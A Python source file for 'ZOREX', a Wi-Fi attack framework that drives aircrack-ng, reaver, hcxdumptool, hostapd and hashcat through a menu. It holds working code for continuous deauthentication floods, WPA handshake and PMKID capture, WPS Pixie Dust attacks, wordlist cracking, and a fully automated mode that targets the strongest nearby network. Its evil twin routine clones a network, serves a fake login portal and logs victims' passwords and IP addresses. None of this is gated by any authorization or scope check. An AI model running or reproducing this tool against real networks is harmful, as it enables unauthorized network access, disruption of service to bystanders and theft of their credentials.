#!/usr/bin/env python3
# ZOREX - Advanced Penetration Testing Framework
# Author: SHEBY
# Version: 3.0 - Enterprise Edition

import subprocess
import sys
import os
import time
import threading
import signal
import re
import json
import hashlib
import binascii
import socket
import netifaces
from datetime import datetime
from collections import defaultdict

VERSION = "3.0.0"
AUTHOR = "SHEBY"

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

def clear_screen():
    os.system('clear')

def print_header():
    clear_screen()
    print(f"""{RED}
╔═══════════════════════════════════════════════════════════════════════════════╗
║{WHITE}   ███████╗ ██████╗ ██████╗ ███████╗██╗  ██╗                             {RED}║
║{WHITE}   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝╚██╗██╔╝                             {RED}║
║{WHITE}     ███╔╝ ██║   ██║██████╔╝█████╗   ╚███╔╝                              {RED}║
║{WHITE}    ███╔╝  ██║   ██║██╔══██╗██╔══╝   ██╔██╗                              {RED}║
║{WHITE}   ███████╗╚██████╔╝██║  ██║███████╗██╔╝ ██╗                             {RED}║
║{WHITE}   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                             {RED}║
║{RED}═══════════════════════════════════════════════════════════════════════════════║
║{WHITE}                     ADVANCED PENETRATION TESTING SUITE                     {RED}║
║{WHITE}                           {DIM}Version: {VERSION} | Author: {AUTHOR}{WHITE}                           {RED}║
╚═══════════════════════════════════════════════════════════════════════════════╝{RESET}
""")

def print_menu():
    print(f"""{CYAN}
┌─────────────────────────────────────────────────────────────────────────────┐
│                            MAIN MENU                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  {WHITE}[{GREEN}01{WHITE}] {CYAN}▶{WHITE}  Network Scanner          {DIM}(WPA2/WPA3/Client Detection){WHITE}              │
│  {WHITE}[{GREEN}02{WHITE}] {CYAN}▶{WHITE}  Deauth Attack            {DIM}(Disconnect Clients){WHITE}                     │
│  {WHITE}[{GREEN}03{WHITE}] {CYAN}▶{WHITE}  Handshake Capture        {DIM}(PMKID + EAPOL){WHITE}                         │
│  {WHITE}[{GREEN}04{WHITE}] {CYAN}▶{WHITE}  WPS Attack               {DIM}(Pixie Dust + Brute){WHITE}                    │
│  {WHITE}[{GREEN}05{WHITE}] {CYAN}▶{WHITE}  Evil Twin Attack         {DIM}(Captive Portal + Cred Harvest){WHITE}         │
│  {WHITE}[{GREEN}06{WHITE}] {CYAN}▶{WHITE}  DNS Spoofing             {DIM}(Redirect Traffic){WHITE}                      │
│  {WHITE}[{GREEN}07{WHITE}] {CYAN}▶{WHITE}  ARP Poisoning            {DIM}(MITM Attack){WHITE}                           │
│  {WHITE}[{GREEN}08{WHITE}] {CYAN}▶{WHITE}  Hash Cracking            {DIM}(GPU/CPU - Wordlist/AI){WHITE}                │
│  {WHITE}[{GREEN}09{WHITE}] {CYAN}▶{WHITE}  Auto Pwn Mode            {DIM}(Fully Automated){WHITE}                       │
│  {WHITE}[{GREEN}10{WHITE}] {CYAN}▶{WHITE}  Session Manager          {DIM}(Save/Load Attack Sessions){WHITE}             │
│  {WHITE}[{GREEN}11{WHITE}] {CYAN}▶{WHITE}  Report Generator         {DIM}(Professional PDF/HTML){WHITE}                │
│  {WHITE}[{GREEN}00{WHITE}] {CYAN}▶{WHITE}  Exit                     {DIM}(Cleanup & Shutdown){WHITE}                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
{RESET}""")

class ZOREX:
    def __init__(self):
        self.interface = None
        self.mon_interface = None
        self.ap_interface = None
        self.networks = {}
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.target_security = None
        self.client_mac = None
        self.handshake_file = None
        self.session_file = None
        self.password_found = None
        self.attack_threads = []
        self.running = True
        self.processes = []
        
    def setup_interface(self):
        print(f"\n{BLUE}[*]{WHITE} Available wireless interfaces:{RESET}")
        result = subprocess.run("iwconfig 2>/dev/null | grep 'IEEE 802.11' | awk '{print $1}'", 
                               shell=True, capture_output=True, text=True)
        interfaces = result.stdout.strip().split('\n')
        
        for idx, iface in enumerate(interfaces, 1):
            print(f"  {GREEN}{idx}.{WHITE} {iface}")
        
        choice = input(f"\n{YELLOW}[?]{WHITE} Select interface: {RESET}")
        try:
            self.interface = interfaces[int(choice)-1]
        except:
            self.interface = "wlan0"
        
        print(f"{BLUE}[*]{WHITE} Enabling monitor mode...{RESET}")
        subprocess.run("sudo airmon-ng check kill", shell=True, capture_output=True)
        result = subprocess.run(f"sudo airmon-ng start {self.interface}", 
                               shell=True, capture_output=True, text=True)
        
        if "mon" in result.stdout:
            self.mon_interface = f"{self.interface}mon"
        else:
            self.mon_interface = self.interface
            
        print(f"{GREEN}[+]{WHITE} Monitor interface: {self.mon_interface}{RESET}")
        time.sleep(1)
        
        subprocess.run("sudo iwconfig", shell=True)
        return True
    
    def scan_networks(self):
        print(f"\n{BLUE}[*]{WHITE} Scanning for wireless networks...{RESET}")
        
        filename = f"zorex_scan_{int(time.time())}"
        cmd = f"sudo timeout 30 airodump-ng -w {filename} --output-format csv {self.mon_interface}"
        subprocess.run(cmd, shell=True, capture_output=True)
        
        csv_file = f"{filename}-01.csv"
        self.networks.clear()
        
        if os.path.exists(csv_file):
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            stations_mode = False
            for line in lines:
                if "Station" in line:
                    stations_mode = True
                    continue
                
                if not stations_mode and ',' in line:
                    parts = line.split(',')
                    if len(parts) > 13 and parts[0].strip() and ':' in parts[0]:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        encryption = parts[5].strip()
                        essid = parts[13].strip()
                        power = parts[8].strip() if len(parts) > 8 else "0"
                        
                        if 'WPA3' in encryption:
                            security = "WPA3"
                        elif 'WPA2' in encryption:
                            security = "WPA2"
                        elif 'WPA' in encryption:
                            security = "WPA"
                        elif 'WEP' in encryption:
                            security = "WEP"
                        else:
                            security = "OPEN"
                        
                        self.networks[bssid] = {
                            'bssid': bssid,
                            'essid': essid if essid else "<Hidden>",
                            'channel': channel,
                            'security': security,
                            'encryption': encryption,
                            'power': power,
                            'clients': []
                        }
                
                elif stations_mode and ',' in line:
                    parts = line.split(',')
                    if len(parts) > 5 and parts[0].strip() and ':' in parts[0]:
                        client = parts[0].strip()
                        for bssid in self.networks:
                            if bssid in line:
                                self.networks[bssid]['clients'].append(client)
            
            os.remove(csv_file)
        
        print(f"\n{GREEN}[+]{WHITE} Found {len(self.networks)} networks{RESET}\n")
        print(f"{CYAN}{'─'*80}{RESET}")
        print(f"{WHITE} ID  {CYAN}BSSID{RESET}              {CYAN}CH{RESET}  {CYAN}SECURITY{RESET}  {CYAN}PWR{RESET}  {CYAN}ESSID{RESET}")
        print(f"{CYAN}{'─'*80}{RESET}")
        
        for idx, (bssid, net) in enumerate(self.networks.items(), 1):
            sec_color = RED if net['security'] == 'WEP' else YELLOW if net['security'] == 'WPA2' else GREEN if net['security'] == 'WPA3' else WHITE
            print(f" {GREEN}{idx:<3}{WHITE} {bssid}  {net['channel']:<3}  {sec_color}{net['security']:<7}{WHITE}  {net['power']:<4}  {net['essid'][:35]}")
            if net['clients']:
                print(f"      {DIM}└─ Clients: {', '.join(net['clients'][:3])}{'...' if len(net['clients']) > 3 else ''}{RESET}")
        
        print(f"{CYAN}{'─'*80}{RESET}")
        return self.networks
    
    def select_target(self):
        if not self.networks:
            print(f"{RED}[!]{WHITE} No networks available. Scan first.{RESET}")
            return False
        
        try:
            choice = int(input(f"\n{YELLOW}[?]{WHITE} Select target: {RESET}")) - 1
            bssid = list(self.networks.keys())[choice]
            self.target_bssid = bssid
            self.target_essid = self.networks[bssid]['essid']
            self.target_channel = self.networks[bssid]['channel']
            self.target_security = self.networks[bssid]['security']
            
            print(f"\n{GREEN}[+]{WHITE} Target locked:{RESET}")
            print(f"      {CYAN}├─{WHITE} ESSID: {self.target_essid}")
            print(f"      {CYAN}├─{WHITE} BSSID: {self.target_bssid}")
            print(f"      {CYAN}├─{WHITE} Channel: {self.target_channel}")
            print(f"      {CYAN}└─{WHITE} Security: {self.target_security}{RESET}")
            
            clients = self.networks[bssid].get('clients', [])
            if clients:
                print(f"\n{YELLOW}[?]{WHITE} Connected clients found:{RESET}")
                for idx, client in enumerate(clients, 1):
                    print(f"      {GREEN}{idx}.{WHITE} {client}")
                
                client_choice = input(f"\n{YELLOW}[?]{WHITE} Select client (0 for broadcast): {RESET}")
                if client_choice != '0':
                    try:
                        self.client_mac = clients[int(client_choice)-1]
                    except:
                        self.client_mac = "FF:FF:FF:FF:FF:FF"
                else:
                    self.client_mac = "FF:FF:FF:FF:FF:FF"
            
            return True
        except:
            print(f"{RED}[!]{WHITE} Invalid selection{RESET}")
            return False
    
    def deauth_attack(self):
        if not self.target_bssid:
            print(f"{RED}[!]{WHITE} No target selected{RESET}")
            return
        
        print(f"\n{RED}[!]{WHITE} Launching DEAUTH attack...{RESET}")
        subprocess.run(f"sudo iwconfig {self.mon_interface} channel {self.target_channel}", shell=True)
        
        cmd = f"sudo aireplay-ng -0 0 -a {self.target_bssid}"
        if self.client_mac and self.client_mac != "FF:FF:FF:FF:FF:FF":
            cmd += f" -c {self.client_mac}"
        cmd += f" {self.mon_interface}"
        
        print(f"{YELLOW}[!]{WHITE} Deauth running. Press Ctrl+C to stop.{RESET}")
        try:
            proc = subprocess.Popen(cmd, shell=True)
            self.processes.append(proc)
            proc.wait()
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!]{WHITE} Deauth stopped{RESET}")
    
    def capture_handshake(self):
        if not self.target_bssid:
            print(f"{RED}[!]{WHITE} No target selected{RESET}")
            return
        
        print(f"\n{BLUE}[*]{WHITE} Capturing WPA handshake...{RESET}")
        
        filename = f"zorex_hs_{self.target_bssid.replace(':', '')}_{int(time.time())}"
        
        cmd_airodump = f"sudo airodump-ng -c {self.target_channel} --bssid {self.target_bssid} -w {filename} {self.mon_interface}"
        airodump_proc = subprocess.Popen(cmd_airodump, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(airodump_proc)
        
        print(f"{GREEN}[+]{WHITE} Listening for handshake...{RESET}")
        time.sleep(3)
        
        print(f"{YELLOW}[!]{WHITE} Sending deauth packets...{RESET}")
        deauth_cmd = f"sudo aireplay-ng -0 3 -a {self.target_bssid}"
        if self.client_mac and self.client_mac != "FF:FF:FF:FF:FF:FF":
            deauth_cmd += f" -c {self.client_mac}"
        deauth_cmd += f" {self.mon_interface}"
        subprocess.run(deauth_cmd, shell=True, capture_output=True)
        
        print(f"{YELLOW}[!]{WHITE} Waiting for handshake (15 sec)...{RESET}")
        time.sleep(15)
        
        cap_file = f"{filename}-01.cap"
        check_cmd = f"sudo aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'"
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
        
        airodump_proc.terminate()
        
        if "1 handshake" in result.stdout:
            self.handshake_file = cap_file
            print(f"\n{GREEN}[✔]{WHITE} HANDSHAKE CAPTURED!{RESET}")
            print(f"      {CYAN}└─{WHITE} File: {cap_file}{RESET}")
            return cap_file
        else:
            print(f"\n{RED}[✘]{WHITE} Handshake not captured{RESET}")
            return None
    
    def capture_pmkid(self):
        print(f"\n{BLUE}[*]{WHITE} Capturing PMKID...{RESET}")
        
        filename = f"zorex_pmkid_{int(time.time())}"
        cmd = f"sudo timeout 45 hcxdumptool -i {self.mon_interface} -o {filename}.pcapng --enable_status=1 -c {self.target_channel} --filterlist_ap={self.target_bssid} --filtermode=2"
        
        print(f"{YELLOW}[!]{WHITE} Running (45 seconds)...{RESET}")
        subprocess.run(cmd, shell=True, capture_output=True)
        
        if os.path.exists(f"{filename}.pcapng"):
            subprocess.run(f"hcxpcapngtool -o {filename}.22000 {filename}.pcapng 2>/dev/null", shell=True)
            if os.path.exists(f"{filename}.22000"):
                self.handshake_file = f"{filename}.22000"
                print(f"{GREEN}[✔]{WHITE} PMKID CAPTURED!{RESET}")
                return f"{filename}.22000"
        
        print(f"{RED}[✘]{WHITE} PMKID not found{RESET}")
        return None
    
    def wps_attack(self):
        if not self.target_bssid:
            print(f"{RED}[!]{WHITE} No target selected{RESET}")
            return
        
        print(f"\n{BLUE}[*]{WHITE} WPS Pixie Dust Attack...{RESET}")
        
        cmd = f"sudo reaver -i {self.mon_interface} -b {self.target_bssid} -c {self.target_channel} -K 1 -N -d 2 -t 2 -T 0.5 -r 3:10 -L -f -g 1 -v"
        
        proc = subprocess.Popen(cmd, shell=True)
        self.processes.append(proc)
        proc.wait()
    
    def evil_twin(self):
        if not self.target_essid:
            print(f"{RED}[!]{WHITE} No target selected{RESET}")
            return
        
        print(f"\n{RED}[!]{WHITE} Starting EVIL TWIN Attack on {self.target_essid}{RESET}")
        
        if not self.ap_interface:
            result = subprocess.run("iwconfig 2>/dev/null | grep 'IEEE 802.11' | awk '{print $1}' | head -2 | tail -1", 
                                   shell=True, capture_output=True, text=True)
            self.ap_interface = result.stdout.strip()
            if not self.ap_interface:
                self.ap_interface = self.interface
        
        os.makedirs("/tmp/zorex_portal", exist_ok=True)
        
        html = f'''<!DOCTYPE html>
<html>
<head><title>Wi-Fi Authentication</title>
<style>
body{{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
.container{{background:#16213e;padding:40px;border-radius:10px;width:350px;text-align:center}}
input{{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}}
button{{width:100%;padding:12px;background:#e94560;color:white;border:none;border-radius:5px;cursor:pointer}}
h2{{color:#eee}}
</style>
</head>
<body>
<div class="container">
<h2>📶 Wi-Fi Authentication</h2>
<p>Network: <strong>{self.target_essid}</strong></p>
<form method="POST" action="/login">
<input type="password" name="pass" placeholder="Enter network password" required>
<button type="submit">Connect</button>
</form>
</div>
</body>
</html>'''
        
        with open("/tmp/zorex_portal/index.html", "w") as f:
            f.write(html)
        
        php = f'''<?php
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$log = "[" . date('Y-m-d H:i:s') . "] IP: $ip | Pass: $pass\\n";
file_put_contents("/tmp/zorex_pass.txt", $log, FILE_APPEND);
header("Location: /?error=1");
?>
'''
        
        with open("/tmp/zorex_portal/login.php", "w") as f:
            f.write(php)
        
        subprocess.run(f"sudo ifconfig {self.ap_interface} down", shell=True)
        subprocess.run(f"sudo iwconfig {self.ap_interface} mode monitor", shell=True)
        subprocess.run(f"sudo ifconfig {self.ap_interface} up", shell=True)
        subprocess.run(f"sudo ifconfig {self.ap_interface} 192.168.1.1 netmask 255.255.255.0", shell=True)
        
        hostapd_conf = f"""/tmp/zorex_hostapd.conf
interface={self.ap_interface}
driver=nl80211
ssid={self.target_essid}
hw_mode=g
channel={self.target_channel}
auth_algs=1
wpa=2
wpa_passphrase=fakepass123
wpa_key_mgmt=WPA-PSK
"""
        with open("/tmp/zorex_hostapd.conf", "w") as f:
            f.write(hostapd_conf)
        
        dnsmasq_conf = f"""interface={self.ap_interface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
"""
        with open("/tmp/zorex_dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)
        
        hostapd_proc = subprocess.Popen(f"sudo hostapd /tmp/zorex_hostapd.conf", shell=True)
        dnsmasq_proc = subprocess.Popen(f"sudo dnsmasq -C /tmp/zorex_dnsmasq.conf -d", shell=True)
        self.processes.extend([hostapd_proc, dnsmasq_proc])
        
        os.chdir("/tmp/zorex_portal")
        web_proc = subprocess.Popen("sudo php -S 0.0.0.0:80 2>/dev/null", shell=True)
        self.processes.append(web_proc)
        
        print(f"\n{GREEN}[✔]{WHITE} Evil Twin Active!{RESET}")
        print(f"      {CYAN}├─{WHITE} Fake AP: {self.target_essid}")
        print(f"      {CYAN}├─{WHITE} Portal: http://192.168.1.1")
        print(f"      {CYAN}└─{WHITE} Passwords: /tmp/zorex_pass.txt{RESET}")
        
        print(f"\n{YELLOW}[!]{WHITE} Starting deauth on real AP...{RESET}")
        deauth_cmd = f"sudo aireplay-ng -0 0 -a {self.target_bssid} {self.mon_interface}"
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True)
        self.processes.append(deauth_proc)
        
        input(f"\n{RED}[!]{WHITE} Press Enter to stop Evil Twin...{RESET}")
    
    def crack_hash(self):
        if not self.handshake_file:
            print(f"{RED}[!]{WHITE} No hash file. Capture handshake first.{RESET}")
            return
        
        print(f"\n{BLUE}[*]{WHITE} Cracking with Hashcat...{RESET}")
        
        wordlist = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(wordlist):
            print(f"{YELLOW}[!]{WHITE} Downloading wordlist...{RESET}")
            subprocess.run("sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null", shell=True)
        
        if self.handshake_file.endswith('.cap'):
            subprocess.run(f"sudo cap2hccapx {self.handshake_file} /tmp/zorex_hash.hccapx", shell=True)
            hash_file = "/tmp/zorex_hash.hccapx"
            mode = 2500
        elif self.handshake_file.endswith('.22000'):
            hash_file = self.handshake_file
            mode = 22000
        else:
            hash_file = self.handshake_file
            mode = 16800
        
        gpu_check = subprocess.run("hashcat -I 2>/dev/null | grep -i 'cuda\\|opencl'", shell=True, capture_output=True)
        
        if gpu_check.returncode == 0:
            print(f"{GREEN}[+]{WHITE} GPU detected! Accelerated cracking...{RESET}")
            cmd = f"sudo hashcat -m {mode} -a 0 {hash_file} {wordlist} -O -w 4 --force -o /tmp/zorex_cracked.txt"
        else:
            print(f"{YELLOW}[!]{WHITE} No GPU. Using CPU (slower)...{RESET}")
            cmd = f"sudo hashcat -m {mode} -a 0 {hash_file} {wordlist} -w 3 --force -o /tmp/zorex_cracked.txt"
        
        subprocess.run(cmd, shell=True)
        
        if os.path.exists("/tmp/zorex_cracked.txt"):
            with open("/tmp/zorex_cracked.txt", 'r') as f:
                content = f.read()
                if ':' in content:
                    self.password_found = content.split(':')[1].strip()
                    print(f"\n{GREEN}[🎉] PASSWORD FOUND: {self.password_found}{RESET}")
                    
                    with open("zorex_cracked.txt", "a") as out:
                        out.write(f"{datetime.now()} | {self.target_essid} | {self.target_bssid} | {self.password_found}\n")
                    return self.password_found
        
        print(f"{RED}[✘]{WHITE} Password not found in wordlist{RESET}")
        return None
    
    def auto_pwn(self):
        print(f"\n{RED}{'█'*70}{RESET}")
        print(f"{WHITE}                    AUTOMATED PENETRATION MODE{RESET}")
        print(f"{RED}{'█'*70}{RESET}")
        
        self.scan_networks()
        
        if not self.networks:
            print(f"{RED}[!]{WHITE} No networks found{RESET}")
            return
        
        strongest = None
        highest_power = -100
        for bssid, net in self.networks.items():
            try:
                power = int(net['power'])
                if power > highest_power and net['security'] != 'WEP':
                    highest_power = power
                    strongest = bssid
            except:
                pass
        
        if strongest:
            self.target_bssid = strongest
            self.target_essid = self.networks[strongest]['essid']
            self.target_channel = self.networks[strongest]['channel']
            self.target_security = self.networks[strongest]['security']
            print(f"{GREEN}[+]{WHITE} Auto-target: {self.target_essid} ({self.target_security}){RESET}")
        else:
            print(f"{RED}[!]{WHITE} No suitable target{RESET}")
            return
        
        if self.target_security == 'WPA3':
            print(f"{BLUE}[*]{WHITE} WPA3 detected. Trying PMKID...{RESET}")
            self.capture_pmkid()
        else:
            self.capture_handshake()
        
        if self.handshake_file:
            self.crack_hash()
        
        if self.password_found:
            print(f"\n{GREEN}{'█'*70}{RESET}")
            print(f"{GREEN}                    PASSWORD RECOVERED{RESET}")
            print(f"{GREEN}{'█'*70}{RESET}")
            print(f"{WHITE}  SSID    : {self.target_essid}")
            print(f"{WHITE}  BSSID   : {self.target_bssid}")
            print(f"{WHITE}  PASSWORD: {GREEN}{self.password_found}{RESET}")
            print(f"{GREEN}{'█'*70}{RESET}")
        else:
            print(f"\n{RED}{'█'*70}{RESET}")
            print(f"{RED}                    ATTEMPT FAILED{RESET}")
            print(f"{RED}{'█'*70}{RESET}")
    
    def report_generator(self):
        print(f"\n{BLUE}[*]{WHITE} Generating penetration test report...{RESET}")
        
        filename = f"zorex_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        html = f"""<!DOCTYPE html>
<html>
<head>
<title>ZOREX Penetration Test Report</title>
<style>
body {{ font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }}
.container {{ max-width: 800px; margin: auto; background: #111; border: 1px solid #0f0; padding: 20px; }}
.header {{ text-align: center; border-bottom: 1px solid #0f0; padding-bottom: 10px; }}
.green {{ color: #0f0; }}
.red {{ color: #f00; }}
.yellow {{ color: #ff0; }}
.box {{ border: 1px solid #0f0; padding: 10px; margin: 10px 0; }}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>ZOREX Penetration Test Report</h1>
<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p>Author: SHEBY</p>
</div>
<div class="box">
<h2>Target Information</h2>
<p><strong>SSID:</strong> {self.target_essid}</p>
<p><strong>BSSID:</strong> {self.target_bssid}</p>
<p><strong>Channel:</strong> {self.target_channel}</p>
<p><strong>Security:</strong> {self.target_security}</p>
</div>
<div class="box">
<h2>Results</h2>
<p><strong>Password:</strong> <span class="green">{self.password_found if self.password_found else 'Not Found'}</span></p>
</div>
<div class="box">
<h2>Tools Used</h2>
<p>ZOREX Framework v3.0 | Aircrack-ng | Hashcat | Reaver</p>
</div>
</div>
</body>
</html>"""
        
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"{GREEN}[+]{WHITE} Report saved: {filename}{RESET}")
    
    def cleanup(self):
        print(f"\n{BLUE}[*]{WHITE} Cleaning up...{RESET}")
        
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        
        subprocess.run("sudo pkill hostapd", shell=True, capture_output=True)
        subprocess.run("sudo pkill dnsmasq", shell=True, capture_output=True)
        subprocess.run("sudo pkill aireplay-ng", shell=True, capture_output=True)
        subprocess.run(f"sudo airmon-ng stop {self.mon_interface}", shell=True, capture_output=True)
        subprocess.run("sudo service NetworkManager restart", shell=True, capture_output=True)
        
        print(f"{GREEN}[+]{WHITE} Cleanup complete{RESET}")
    
    def run(self):
        self.setup_interface()
        
        while self.running:
            print_header()
            print_menu()
            choice = input(f"\n{YELLOW}[{WHITE}>{YELLOW}]{WHITE} ZOREX: {RESET}")
            
            if choice == '01':
                self.scan_networks()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '02':
                self.scan_networks()
                if self.select_target():
                    self.deauth_attack()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '03':
                self.scan_networks()
                if self.select_target():
                    if not self.capture_handshake():
                        self.capture_pmkid()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '04':
                self.scan_networks()
                if self.select_target():
                    self.wps_attack()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '05':
                self.scan_networks()
                if self.select_target():
                    self.evil_twin()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '06':
                input(f"\n{YELLOW}[!]{WHITE} DNS Spoofing coming in v3.1{RESET}")
            
            elif choice == '07':
                input(f"\n{YELLOW}[!]{WHITE} ARP Poisoning coming in v3.1{RESET}")
            
            elif choice == '08':
                if not self.handshake_file:
                    print(f"{RED}[!]{WHITE} No handshake. Capture first.{RESET}")
                else:
                    self.crack_hash()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '09':
                self.auto_pwn()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '10':
                input(f"\n{YELLOW}[!]{WHITE} Session Manager coming in v3.1{RESET}")
            
            elif choice == '11':
                self.report_generator()
                input(f"\n{YELLOW}[!]{WHITE} Press Enter...{RESET}")
            
            elif choice == '00':
                self.running = False
                self.cleanup()
                print(f"{GREEN}[+]{WHITE} ZOREX terminated. Goodbye!{RESET}")
            
            else:
                print(f"{RED}[!]{WHITE} Invalid option{RESET}")
                time.sleep(1)

def main():
    if os.geteuid() != 0:
        print(f"{RED}[!]{WHITE} ZOREX requires root privileges{RESET}")
        print(f"Run: sudo python3 zorex.py")
        sys.exit(1)
    
    zorex = ZOREX()
    
    def signal_handler(sig, frame):
        print(f"\n{RED}[!]{WHITE} Interrupted{RESET}")
        zorex.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    zorex.run()

if __name__ == "__main__":
    main()
